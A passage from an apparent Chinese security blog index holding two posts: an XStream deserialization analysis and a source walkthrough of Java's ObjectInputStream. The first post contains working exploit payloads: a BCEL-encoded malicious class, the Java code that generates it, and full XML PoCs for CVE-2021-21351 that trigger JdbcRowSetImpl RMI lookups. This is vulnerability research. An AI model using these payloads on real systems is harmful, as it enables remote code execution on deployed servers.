&lt;string&gt;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A&lt;/string&gt; &lt;/a&gt; &lt;/outer-class&gt; &lt;/names&gt; &lt;processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'&gt; &lt;parent class='sun.misc.Launcher$ExtClassLoader'&gt; &lt;/parent&gt; &lt;package2certs class='hashtable'/&gt; &lt;classes defined-in='java.lang.ClassLoader'/&gt; &lt;defaultDomain&gt; &lt;classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/&gt; &lt;principals/&gt; &lt;hasAllPerm&gt;false&lt;/hasAllPerm&gt; &lt;staticPermissions&gt;false&lt;/staticPermissions&gt; &lt;key&gt; &lt;outer-class reference='../..'/&gt; &lt;/key&gt; &lt;/defaultDomain&gt; &lt;packages/&gt; &lt;nativeLibraries/&gt; &lt;assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/&gt; &lt;defaultAssertionStatus&gt;false&lt;/defaultAssertionStatus&gt; &lt;classes/&gt; &lt;ignored__packages&gt; &lt;string&gt;java.&lt;/string&gt; &lt;string&gt;javax.&lt;/string&gt; &lt;string&gt;sun.&lt;/string&gt; &lt;/ignored__packages&gt; &lt;repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'&gt; &lt;__path&gt; &lt;paths/&gt; &lt;class__path&gt;.&lt;/class__path&gt; &lt;/__path&gt; &lt;__loadedClasses/&gt; &lt;/repository&gt; &lt;deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/&gt; &lt;/processorCL&gt; &lt;/iterator&gt; &lt;type&gt;KEYS&lt;/type&gt; &lt;/e&gt; &lt;in class='java.io.ByteArrayInputStream'&gt; &lt;buf&gt;&lt;/buf&gt; &lt;pos&gt;0&lt;/pos&gt; &lt;mark&gt;0&lt;/mark&gt; &lt;count&gt;0&lt;/count&gt; &lt;/in&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&gt; &lt;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/&gt; &lt;/java.util.PriorityQueue&gt;&lt;/java.util.PriorityQueue&gt; 复现： 按照三梦师傅的Payload生成代码： 12345678910111213141516171819202122import com.sun.org.apache.bcel.internal.classfile.Utility;import java.io.IOException;import java.io.InputStream;/** * @author threedr3am */public class Evil &#123; public Evil() throws IOException &#123; Runtime.getRuntime().exec(\"open -a calculator\"); &#125; public static void main(String[] args) throws IOException &#123; InputStream inputStream = Evil.class.getResourceAsStream(\"Evil.class\"); byte[] bytes = new byte[inputStream.available()]; inputStream.read(bytes); String code = Utility.encode(bytes, true); String bcel = \"$$BCEL$$\" + code; System.out.println(bcel); &#125;&#125; 调试： 加载恶意Class的Classloader不再使用URLClassloader去远程加载，而是采用了com.sun.org.apache.bcel.internal.util.ClassLoader，使用了BCEL的方式来进行恶意代码执行。 CVE_2021_21351漏洞成因JdbcRowSetImpl攻击 高版本PoC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;sorted-set&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'&gt; &lt;m__DTMXRTreeFrag&gt; &lt;m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'&gt; &lt;m__size&gt;-10086&lt;/m__size&gt; &lt;m__mgrDefault&gt; &lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt; &lt;m__incremental&gt;false&lt;/m__incremental&gt; &lt;m__source__location&gt;false&lt;/m__source__location&gt; &lt;m__dtms&gt; &lt;null/&gt; &lt;/m__dtms&gt; &lt;m__defaultHandler/&gt; &lt;/m__mgrDefault&gt; &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt; &lt;m__indexing&gt;false&lt;/m__indexing&gt; &lt;m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'&gt; &lt;fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'&gt; &lt;javax.sql.rowset.BaseRowSet&gt; &lt;default&gt; &lt;concurrency&gt;1008&lt;/concurrency&gt; &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt; &lt;fetchDir&gt;1000&lt;/fetchDir&gt; &lt;fetchSize&gt;0&lt;/fetchSize&gt; &lt;isolation&gt;2&lt;/isolation&gt; &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt; &lt;maxRows&gt;0&lt;/maxRows&gt; &lt;queryTimeout&gt;0&lt;/queryTimeout&gt; &lt;readOnly&gt;true&lt;/readOnly&gt; &lt;rowSetType&gt;1004&lt;/rowSetType&gt; &lt;showDeleted&gt;false&lt;/showDeleted&gt; &lt;dataSource&gt;rmi://localhost:15000/CallRemoteMethod&lt;/dataSource&gt; &lt;listeners/&gt; &lt;params/&gt; &lt;/default&gt; &lt;/javax.sql.rowset.BaseRowSet&gt; &lt;com.sun.rowset.JdbcRowSetImpl&gt; &lt;default/&gt; &lt;/com.sun.rowset.JdbcRowSetImpl&gt; &lt;/fPullParserConfig&gt; &lt;fConfigSetInput&gt; &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt; &lt;name&gt;setAutoCommit&lt;/name&gt; &lt;parameter-types&gt; &lt;class&gt;boolean&lt;/class&gt; &lt;/parameter-types&gt; &lt;/fConfigSetInput&gt; &lt;fConfigParse reference='../fConfigSetInput'/&gt; &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt; &lt;/m__incrementalSAXSource&gt; &lt;m__walker&gt; &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt; &lt;/m__walker&gt; &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt; &lt;m__idAttributes/&gt; &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt; &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt; &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt; &lt;/m__dtm&gt; &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt; &lt;/m__DTMXRTreeFrag&gt; &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt; &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt; &lt;m__obj class='string'&gt;test&lt;/m__obj&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;&lt;/sorted-set&gt; 低版本PoC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;sorted-set&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'&gt; &lt;m__DTMXRTreeFrag&gt; &lt;m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'&gt; &lt;m__size&gt;-10086&lt;/m__size&gt; &lt;m__mgrDefault&gt; &lt;__useServicesMechanism&gt;false&lt;/__useServicesMechanism&gt; &lt;m__incremental&gt;false&lt;/m__incremental&gt; &lt;m__source__location&gt;false&lt;/m__source__location&gt; &lt;m__dtms&gt; &lt;null/&gt; &lt;/m__dtms&gt; &lt;m__defaultHandler/&gt; &lt;/m__mgrDefault&gt; &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt; &lt;m__indexing&gt;false&lt;/m__indexing&gt; &lt;m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'&gt; &lt;fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'&gt; &lt;javax.sql.rowset.BaseRowSet&gt; &lt;default&gt; &lt;concurrency&gt;1008&lt;/concurrency&gt; &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt; &lt;fetchDir&gt;1000&lt;/fetchDir&gt; &lt;fetchSize&gt;0&lt;/fetchSize&gt; &lt;isolation&gt;2&lt;/isolation&gt; &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt; &lt;maxRows&gt;0&lt;/maxRows&gt; &lt;queryTimeout&gt;0&lt;/queryTimeout&gt; &lt;readOnly&gt;true&lt;/readOnly&gt; &lt;rowSetType&gt;1004&lt;/rowSetType&gt; &lt;showDeleted&gt;false&lt;/showDeleted&gt; &lt;dataSource&gt;rmi://localhost:15000/CallRemoteMethod&lt;/dataSource&gt; &lt;listeners/&gt; &lt;params/&gt; &lt;/default&gt; &lt;/javax.sql.rowset.BaseRowSet&gt; &lt;com.sun.rowset.JdbcRowSetImpl&gt; &lt;default/&gt; &lt;/com.sun.rowset.JdbcRowSetImpl&gt; &lt;/fPullParserConfig&gt; &lt;fConfigSetInput&gt; &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt; &lt;name&gt;setAutoCommit&lt;/name&gt; &lt;parameter-types&gt; &lt;class&gt;boolean&lt;/class&gt; &lt;/parameter-types&gt; &lt;/fConfigSetInput&gt; &lt;fConfigParse reference='../fConfigSetInput'/&gt; &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt; &lt;/m__incrementalSAXSource&gt; &lt;m__walker&gt; &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt; &lt;/m__walker&gt; &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt; &lt;m__idAttributes/&gt; &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt; &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt; &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt; &lt;/m__dtm&gt; &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt; &lt;/m__DTMXRTreeFrag&gt; &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt; &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;type&gt;ysomap&lt;/type&gt; &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt; &lt;m__obj class='string'&gt;test&lt;/m__obj&gt; &lt;/value&gt; &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;&lt;/sorted-set&gt; 调试： &lt;sorted-set&gt;是最外层的对象，内部包含着两个javax.naming.ldap.Rdn$RdnEntry成员。 那么在第二个RdnEntry成员加入到sorted-set的时候，会调用Rdn$RdnEntry.compareTo方法 这里m_DTMXRTreeFrag.getDTM()实际上获取SAX2DTM对象，之后调用SAX2DTM#getStringvalue方法： 来到nextNode()方法： 该方法中调用了m_incrementalSAXSource属性也就是POC中封装好的IncrementalSAXSource_Xerces对象的deliverMoreNodes方法。 接下来分别执行：IncrementalSAXSource_Xerces.java:312 来到IncrementalSAXSource_Xerces.parseSome方法 其中这里fConfigParse、fPullParserConfig、parmsfalse 都可控，之后该方法会通过反射调用JdbcRowSetImpl.setAutoCommit方法，结合JdbcRowSetImpl攻击。 参考 XStream源码解析 1","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"XStream","slug":"XStream","permalink":"https://0range228.github.io/tags/XStream/"}]},{"title":"Java反序列化流程梳理","slug":"Java反序列化流程梳理","date":"2021-07-17T03:24:19.000Z","updated":"2021-07-17T07:44:44.651Z","comments":true,"path":"Java反序列化流程梳理/","link":"","permalink":"https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/","excerpt":"序言 浮云游子意，落日故人情。 梳理Java反序列化流程。 参考panda师傅。","text":"序言 浮云游子意，落日故人情。 梳理Java反序列化流程。 参考panda师傅。 写在前面有了前两篇序列化协议、序列化流程梳理作为学习基础，反序列化操作就好理解多了。 我们知道序列化的核心原理： 创建一个ObjectOutputStream输出流，调用 流对象的writeObject方法，将对象序列化保存。 那么其实反序列化就是对称的： 创建一个ObjectInputStream输入流，调用ois流对象的readObject方法，将内容还原为内存中的对象。 流程分析老规矩 还是先上demo： 1234567891011121314151617public class Student implements Serializable &#123; private static final long serialVersionUID = 2L; private String name; private int age; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; public static void main(String[] args) throws Exception &#123; //反序列化 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"10range.ser\")); Student o = (Student)ois.readObject(); ois.close(); &#125;&#125; 核心还是两句话： 12ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"10range.ser\"));Student o = (Student)ois.readObject(); 构造函数看ObjectInputStream的构造方法： 12345678910public ObjectInputStream(InputStream in) throws IOException &#123; verifySubclass(); bin = new BlockDataInputStream(in); handles = new HandleTable(10); vlist = new ValidationList(); serialFilter = ObjectInputFilter.Config.getSerialFilter(); enableOverride = false; readStreamHeader(); bin.setBlockDataMode(true);&#125; 和序列化一样，同样先是verifySubclass()查看是否可以在不违反安全约束的情况下构造此实例。 四个全局变量： 12345678/** filter stream for handling block data conversion */private final BlockDataInputStream bin;/** validation callback list */private final ValidationList vlist;/** wire handle -&gt; obj/exception map */private final HandleTable handles;/** if true, invoke readObjectOverride() instead of readObject() */private final boolean enableOverride; 在oos里面的bout，ois里面则是bin，作用是对称的。 比较特殊的是： visit是一个用来提供CallBack操作的验证集合 几个全局变量初始化之后： readStreamHeader();：读取序列化文件的头部，验证魔数和序列化版本是否匹配 bin.setBlockDataMode(true);：设置为块数据读取模式 readObject当public构造函数执行完毕之后，就该执行readObject方法： 1234567891011121314151617181920212223242526public final Object readObject() throws IOException, ClassNotFoundException&#123; if (enableOverride) &#123; return readObjectOverride(); &#125; // if nested read, passHandle contains handle of enclosing object int outerHandle = passHandle; try &#123; Object obj = readObject0(false); handles.markDependency(outerHandle, passHandle); ClassNotFoundException ex = handles.lookupException(passHandle); if (ex != null) &#123; throw ex; &#125; if (depth == 0) &#123; vlist.doCallbacks(); &#125; return obj; &#125; finally &#123; passHandle = outerHandle; if (closed &amp;&amp; depth == 0) &#123; clear(); &#125; &#125;&#125; 同理，也是把主要操作交给了readObject方法来完成。 readObject01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192/** * Underlying readObject implementation. */private Object readObject0(boolean unshared) throws IOException &#123; boolean oldMode = bin.getBlockDataMode(); if (oldMode) &#123; int remain = bin.currentBlockRemaining(); if (remain &gt; 0) &#123; throw new OptionalDataException(remain); &#125; else if (defaultDataEnd) &#123; /* * Fix for 4360508: stream is currently at the end of a field * value block written via default serialization; since there * is no terminating TC_ENDBLOCKDATA tag, simulate * end-of-custom-data behavior explicitly. */ throw new OptionalDataException(true); &#125; bin.setBlockDataMode(false); &#125; byte tc; //从序列化信息中获取第一个字节 while ((tc = bin.peekByte()) == TC_RESET) &#123; bin.readByte(); handleReset(); &#125; depth++; totalObjectRefs++; // 如果是对象的序列化，tc=0x73,也就是TC_OBJECT， try &#123; switch (tc) &#123; case TC_NULL: return readNull(); case TC_REFERENCE: // handle return readHandle(unshared); case TC_CLASS: return readClass(unshared); case TC_CLASSDESC: case TC_PROXYCLASSDESC: return readClassDesc(unshared); case TC_STRING: case TC_LONGSTRING: return checkResolve(readString(unshared)); case TC_ARRAY: return checkResolve(readArray(unshared)); case TC_ENUM: return checkResolve(readEnum(unshared)); case TC_OBJECT: // Object return checkResolve(readOrdinaryObject(unshared)); case TC_EXCEPTION: IOException ex = readFatalException(); throw new WriteAbortedException(\"writing aborted\", ex); case TC_BLOCKDATA: case TC_BLOCKDATALONG: if (oldMode) &#123; bin.setBlockDataMode(true); bin.peek(); // force header read throw new OptionalDataException( bin.currentBlockRemaining()); &#125; else &#123; throw new StreamCorruptedException( \"unexpected block data\"); &#125; case TC_ENDBLOCKDATA: if (oldMode) &#123; throw new OptionalDataException(true); &#125; else &#123; throw new StreamCorruptedException( \"unexpected end of block data\"); &#125; default: throw new StreamCorruptedException( String.format(\"invalid type code: %02X\", tc)); &#125; &#125; finally &#123; depth--; bin.setBlockDataMode(oldMode); &#125;&#125; 这里匹配到这里： 12case TC_OBJECT: return checkResolve(readOrdinaryObject(unshared)); readOrdinaryObject1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071/** * Reads and returns \"ordinary\" (i.e., not a String, Class, * ObjectStreamClass, array, or enum constant) object, or null if object's * class is unresolvable (in which case a ClassNotFoundException will be * associated with object's handle). Sets passHandle to object's assigned * handle. */private Object readOrdinaryObject(boolean unshared) throws IOException&#123; //首先再次确认TC_OBJECT，不是的话直接报错 if (bin.readByte() != TC_OBJECT) &#123; throw new InternalError(); &#125; //读取当前类的类描述符号 ObjectStreamClass desc = readClassDesc(false); //检查是否可以反序列化 desc.checkDeserialize(); Class&lt;?&gt; cl = desc.forClass(); if (cl == String.class || cl == Class.class || cl == ObjectStreamClass.class) &#123; throw new InvalidClassException(\"invalid class descriptor\"); &#125; Object obj; try &#123; obj = desc.isInstantiable() ? desc.newInstance() : null; &#125; catch (Exception ex) &#123; throw (IOException) new InvalidClassException( desc.forClass().getName(), \"unable to create instance\").initCause(ex); &#125; passHandle = handles.assign(unshared ? unsharedMarker : obj); ClassNotFoundException resolveEx = desc.getResolveException(); if (resolveEx != null) &#123; handles.markException(passHandle, resolveEx); &#125; if (desc.isExternalizable()) &#123; readExternalData((Externalizable) obj, desc); &#125; else &#123; readSerialData(obj, desc); &#125; handles.finish(passHandle); if (obj != null &amp;&amp; handles.lookupException(passHandle) == null &amp;&amp; desc.hasReadResolveMethod()) &#123; Object rep = desc.invokeReadResolve(obj); if (unshared &amp;&amp; rep.getClass().isArray()) &#123; rep = cloneArray(rep); &#125; if (rep != obj) &#123; // Filter the replacement object if (rep != null) &#123; if (rep.getClass().isArray()) &#123; filterCheck(rep.getClass(), Array.getLength(rep)); &#125; else &#123; filterCheck(rep.getClass(), -1); &#125; &#125; handles.setObject(passHandle, obj = rep); &#125; &#125; return obj;&#125; 从ObjectStreamClass desc = readClassDesc(false);这句进入readClassDesc方法： 123456789101112131415161718192021222324private ObjectStreamClass readClassDesc(boolean unshared) throws IOException&#123; byte tc = bin.peekByte(); ObjectStreamClass descriptor; switch (tc) &#123; case TC_NULL: descriptor = (ObjectStreamClass) readNull(); break; case TC_REFERENCE: descriptor = (ObjectStreamClass) readHandle(unshared); break; case TC_PROXYCLASSDESC: descriptor = readProxyDesc(unshared); break; case TC_CLASSDESC: descriptor = readNonProxyDesc(unshared); break; default: throw new StreamCorruptedException( String.format(\"invalid type code: %02X\", tc)); &#125; return descriptor;&#125; readClassDesc读取类描述符，所以进入case TC_CLASSDESC : readNonProxyDesc： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657/** * Reads in and returns class descriptor for a class that is not a dynamic * proxy class. Sets passHandle to class descriptor's assigned handle. If * class descriptor cannot be resolved to a class in the local VM, a * ClassNotFoundException is associated with the descriptor's handle. */private ObjectStreamClass readNonProxyDesc(boolean unshared) throws IOException&#123; if (bin.readByte() != TC_CLASSDESC) &#123; throw new InternalError(); &#125; ObjectStreamClass desc = new ObjectStreamClass(); int descHandle = handles.assign(unshared ? unsharedMarker : desc); passHandle = NULL_HANDLE; ObjectStreamClass readDesc = null; try &#123; readDesc = readClassDescriptor();//进入 &#125; catch (ClassNotFoundException ex) &#123; throw (IOException) new InvalidClassException( \"failed to read class descriptor\").initCause(ex); &#125; Class&lt;?&gt; cl = null; ClassNotFoundException resolveEx = null; bin.setBlockDataMode(true); final boolean checksRequired = isCustomSubclass(); try &#123; if ((cl = resolveClass(readDesc)) == null) &#123; resolveEx = new ClassNotFoundException(\"null class\"); &#125; else if (checksRequired) &#123; ReflectUtil.checkPackageAccess(cl); &#125; &#125; catch (ClassNotFoundException ex) &#123; resolveEx = ex; &#125; // Call filterCheck on the class before reading anything else filterCheck(cl, -1); skipCustomData(); try &#123; totalObjectRefs++; depth++; desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false)); &#125; finally &#123; depth--; &#125; handles.finish(descHandle); passHandle = descHandle; return desc;&#125; 接着进入到readClassDescriptor方法： 123456protected ObjectStreamClass readClassDescriptor() throws IOException, ClassNotFoundException&#123; ObjectStreamClass desc = new ObjectStreamClass(); desc.readNonProxy(this); return desc;&#125; 进入readNonProxy，读取desc对应的元数据信息： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051void readNonProxy(ObjectInputStream in) throws IOException, ClassNotFoundException&#123; // 类名 name = in.readUTF(); // serialVersionUID suid = Long.valueOf(in.readLong()); isProxy = false; byte flags = in.readByte(); hasWriteObjectData = ((flags &amp; ObjectStreamConstants.SC_WRITE_METHOD) != 0); hasBlockExternalData = ((flags &amp; ObjectStreamConstants.SC_BLOCK_DATA) != 0); externalizable = ((flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != 0); boolean sflag = ((flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != 0); if (externalizable &amp;&amp; sflag) &#123; throw new InvalidClassException( name, \"serializable and externalizable flags conflict\"); &#125; serializable = externalizable || sflag; isEnum = ((flags &amp; ObjectStreamConstants.SC_ENUM) != 0); if (isEnum &amp;&amp; suid.longValue() != 0L) &#123; throw new InvalidClassException(name, \"enum descriptor has non-zero serialVersionUID: \" + suid); &#125; int numFields = in.readShort(); if (isEnum &amp;&amp; numFields != 0) &#123; throw new InvalidClassException(name, \"enum descriptor has non-zero field count: \" + numFields); &#125; fields = (numFields &gt; 0) ? new ObjectStreamField[numFields] : NO_FIELDS; // 从字节流中读取每一个字段的信息 for (int i = 0; i &lt; numFields; i++) &#123; char tcode = (char) in.readByte(); String fname = in.readUTF(); String signature = ((tcode == 'L') || (tcode == '[')) ? in.readTypeString() : new String(new char[] &#123; tcode &#125;); try &#123; fields[i] = new ObjectStreamField(fname, signature, false); &#125; catch (RuntimeException e) &#123; throw (IOException) new InvalidClassException(name, \"invalid descriptor for field \" + fname).initCause(e); &#125; &#125; computeFieldOffsets();&#125; fields其实是类中每个字段的信息，包括：字段名称，字段类型，字段代码。 序列化操作中，在writeNonProxy中写入的TypeCode、fieldName、fieldType在这里被读取。 之后会回到这里： 123456789101112131415161718192021222324252627282930313233343536373839404142readNonProxyDesc&#123; ... ObjectStreamClass readDesc = null; try &#123; readDesc = readClassDescriptor();//进入-继续 &#125; catch (ClassNotFoundException ex) &#123; throw (IOException) new InvalidClassException( \"failed to read class descriptor\").initCause(ex); &#125; Class&lt;?&gt; cl = null; ClassNotFoundException resolveEx = null; bin.setBlockDataMode(true);//开启data-block模式 final boolean checksRequired = isCustomSubclass(); try &#123; if ((cl = resolveClass(readDesc)) == null) &#123;//进入 resolveEx = new ClassNotFoundException(\"null class\"); &#125; else if (checksRequired) &#123; ReflectUtil.checkPackageAccess(cl); &#125; &#125; catch (ClassNotFoundException ex) &#123; resolveEx = ex; &#125; // Call filterCheck on the class before reading anything else filterCheck(cl, -1); skipCustomData(); try &#123; totalObjectRefs++; depth++; desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false)); &#125; finally &#123; depth--; &#125; handles.finish(descHandle); passHandle = descHandle; return desc;&#125; 进入resolveClass方法： 123456789101112131415protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException&#123; String name = desc.getName(); try &#123; return Class.forName(name, false, latestUserDefinedLoader()); &#125; catch (ClassNotFoundException ex) &#123; Class&lt;?&gt; cl = primClasses.get(name); if (cl != null) &#123; return cl; &#125; else &#123; throw ex; &#125; &#125;&#125; 这里看到Class.forName()操作，会尝试加载本地类。 其实就是反序列化的根本原因，Runtime类在这里被加载，执行了exec() 序列化操作中，oos的annotateClass、annotateProxyClass和replaceObject方法 反序列化操作中对应resolveClass、resolveProxyClass、resolveObject方法 执行结束之后该进入filterCheck(cl, -1); ： 123456789101112131415161718192021222324252627282930313233343536private void filterCheck(Class&lt;?&gt; clazz, int arrayLength) throws InvalidClassException &#123; if (serialFilter != null) &#123; RuntimeException ex = null; ObjectInputFilter.Status status; try &#123; status = serialFilter.checkInput(new FilterValues(clazz, arrayLength, totalObjectRefs, depth, bin.getBytesRead())); &#125; catch (RuntimeException e) &#123; // Preventive interception of an exception to log status = ObjectInputFilter.Status.REJECTED; ex = e; &#125; if (status == null || status == ObjectInputFilter.Status.REJECTED) &#123; // Debug logging of filter checks that fail if (Logging.infoLogger != null) &#123; Logging.infoLogger.info( \"ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;\", status, clazz, arrayLength, totalObjectRefs, depth, bin.getBytesRead(), Objects.toString(ex, \"n/a\")); &#125; InvalidClassException ice = new InvalidClassException(\"filter status: \" + status); ice.initCause(ex); throw ice; &#125; else &#123; // Trace logging for those that succeed if (Logging.traceLogger != null) &#123; Logging.traceLogger.finer( \"ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;\", status, clazz, arrayLength, totalObjectRefs, depth, bin.getBytesRead(), Objects.toString(ex, \"n/a\")); &#125; &#125; &#125;&#125; 如果serialFilter非空，那么调用序列化筛选器，这个筛选器调用了serialFilter.checkInput方法检查序列化数据，如果检测出来了异常，那么会令status为Status.REJECTED状态，filterCheck将会根据serialFilter.checkInput的检查结果来决定是否执行反序列化，如果checkInput()方法返回Status.REJECTED，反序列化将会被阻止，并抛出InvalidClassException()错误： 如果checkInput()方法返回Status.ALLOWED，说明程序允许反序列化。 回到上一个流程，该轮到：skipCustomData();方法： 在结束了反序列化内容检测后，会调用skipCustomData方法跳过所有数据块和对象，直到遇到TC_ENDBLOCKDATA标识： 12345678910111213141516171819202122232425262728/** * Skips over all block data and objects until TC_ENDBLOCKDATA is * encountered. */private void skipCustomData() throws IOException &#123; int oldHandle = passHandle; for (;;) &#123; if (bin.getBlockDataMode()) &#123; bin.skipBlockData(); bin.setBlockDataMode(false); &#125; switch (bin.peekByte()) &#123; case TC_BLOCKDATA: case TC_BLOCKDATALONG: bin.setBlockDataMode(true); break; case TC_ENDBLOCKDATA: bin.readByte(); passHandle = oldHandle; return; default: readObject0(false); break; &#125; &#125;&#125; 接下来回到主线：readNonProxyDesc函数 该来到： 12345678910try &#123; totalObjectRefs++; depth++; desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false)); // 1&#125; finally &#123; depth--;&#125;handles.finish(descHandle);//2passHandle = descHandle; 这里首先调用ObjectStreamClass中的initNonProxy方法，在这个方法里会初始化表示非代理类的类描述符。 接下来会调用调用handles的finish方法完成引用Handle的赋值操作 最后将结果赋值给passHandle成员属性（初始定义为private int passHandle = NULL_HANDLE;） 到这里，readNonProxyDesc结束 将得到的desc类描述信息赋值给descriptor变量： 123456789101112private ObjectStreamClass readNonProxyDesc(boolean unshared) throws IOException&#123;if (bin.readByte() != TC_CLASSDESC) &#123; throw new InternalError();&#125;ObjectStreamClass desc = new ObjectStreamClass();int descHandle = handles.assign(unshared ? unsharedMarker : desc);passHandle = NULL_HANDLE;... return desc;&#125; 12345678910readClassDesc&#123; case TC_CLASSDESC: descriptor = readNonProxyDesc(unshared); break; default: throw new StreamCorruptedException( String.format(\"invalid type code: %02X\", tc)); &#125; return descriptor;&#125; 后将descriptor作为结果返回给readOrdinaryObject方法，赋值给desc； 1234567891011private Object readOrdinaryObject(boolean unshared) throws IOException&#123; if (bin.readByte() != TC_OBJECT) &#123; throw new InternalError(); &#125; ObjectStreamClass desc = readClassDesc(false); desc.checkDeserialize(); Class&lt;?&gt; cl = desc.forClass(); ... 